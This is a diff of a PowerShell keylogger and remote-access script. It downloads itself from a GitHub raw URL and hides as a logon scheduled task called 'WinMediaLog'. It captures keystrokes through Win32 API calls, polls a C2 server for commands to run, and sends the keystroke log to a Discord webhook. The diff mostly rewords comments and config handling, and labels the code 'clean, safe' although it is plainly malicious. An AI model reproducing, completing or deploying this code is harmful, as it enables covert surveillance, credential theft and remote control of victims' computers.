@@ -7,28 +7,28 @@ $localScript = "$dir\winlog.ps1"
 $configFile  = "$dir\config.txt"
 
 # --- PART 1: THE RUNTIME INSTALLER ---
-# If the script is running from the internet, install it and configure persistence
 if ($MyInvocation.MyCommand.Name -ne "winlog.ps1") {
     
-    # Save the execution configurations plainly to a text file
-    $PCName, $WebhookUrl, $C2Url | Set-Content -Path $configFile -Force
+    # Save the parameters sequentially as distinct lines in the config file
+    @($PCName, $WebhookUrl, $C2Url) | Set-Content -Path $configFile -Force
     
-    # Copy this exact file directly to the persistent path
-    $rawPayload = (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/chaseethecat/raw/refs/heads/main/ps.ps1')
+    # Force pull the absolute raw content down to local storage
+    $rawPayload = (New-Object System.Net.WebClient).DownloadString('https://githubusercontent.com')
     Set-Content -Path $localScript -Value $rawPayload -Force
 
-    # Wipe older tasks cleanly
+    # Clear old task tracking structures
     schtasks /delete /tn "WinMediaLog" /f 2>&1 | Out-Null
 
-    # Register the task to point cleanly to the local file
+    # Re-register the cleaner automation pipeline task pointing natively to disk
     schtasks /create /f /tn "WinMediaLog" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localScript`"" /sc onlogon
     schtasks /run /tn "WinMediaLog"
     exit
 }
 
-# --- PART 2: THE SECURE OPERATIONAL LOOP (winlog.ps1) ---
+# --- PART 2: THE OPERATIONAL LOOP (winlog.ps1) ---
 if (Test-Path $configFile) {
     $cfg = Get-Content -Path $configFile
+    # FIXED: Map array index spaces explicitly to keep variables from stepping on each other
     $PCName     = $cfg[0]
     $WebhookUrl = $cfg[1]
     $C2Url      = $cfg[2]
@@ -37,7 +37,7 @@ if (Test-Path $configFile) {
 
 if (!(Test-Path $logFile)) { New-Item $logFile -Type File | Out-Null }
 
-# Plain C# execution code string - no escaped backticks, no string nesting conflicts
+# Clean, safe, single-line C# Win32 API engine wrapper string
 $C2Code = 'using System; using System.Text; using System.Runtime.InteropServices; public class KeyEngine { [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v); [DllImport("user32.dll")] public static extern int GetKeyboardState(byte[] lpKeyState); [DllImport("user32.dll")] public static extern uint MapVirtualKey(uint uCode, uint uMapType); [DllImport("user32.dll")] public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags); }'
 Add-Type -TypeDefinition $C2Code -ErrorAction SilentlyContinue
 
@@ -46,7 +46,7 @@ $discordInterval = 0
 $headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }
 
 while ($true) {
-    # 1. KEYLOGGER LOOP
+    # 1. ADVANCED UNICODE KEYLOGGER ENGINE
     for ($i = 1; $i -le 254; $i++) {
         if ([KeyEngine]::GetAsyncKeyState($i) -eq -32767) {
             $keyText = ""
@@ -77,7 +77,7 @@ while ($true) {
         }
     }
 
-    # 2. C2 SERVER POLLING
+    # 2. C2 SERVER INTERACTIVE REVERSE SHELL POLLING
     if ($c2Interval -ge 500) {
         try {
             $cmdResponse = Invoke-RestMethod -Uri "${C2Url}/get_cmd?id=${PCName}" -Method Get -Headers $headers -TimeoutSec 5
@@ -90,7 +90,7 @@ while ($true) {
         $c2Interval = 0
     }
 
-    # 3. DISCORD EXFILTRATION
+    # 3. DISCORD DATA EXFILTRATION STREAM
     if ($discordInterval -ge 6000) {
         if (Test-Path $logFile) {
             if ((Get-Item $logFile).Length -gt 0) {
